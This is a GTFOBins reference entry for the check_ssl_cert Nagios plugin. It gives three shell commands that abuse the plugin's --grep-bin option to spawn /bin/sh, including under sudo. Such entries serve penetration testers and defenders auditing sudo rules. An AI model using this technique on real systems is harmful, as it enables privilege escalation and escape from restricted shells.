<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/check_ssl_cert -->
---
comment: |-
  This is the `check_ssl_cert` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.
functions:
  shell:
  - code: |-
      echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file
      chmod +x /path/to/temp-file
      check_ssl_cert --grep-bin /path/to/temp-file -H x
    comment: |-
      The shell will be invoked multiple times.
    contexts:
      sudo:
      unprivileged:
...
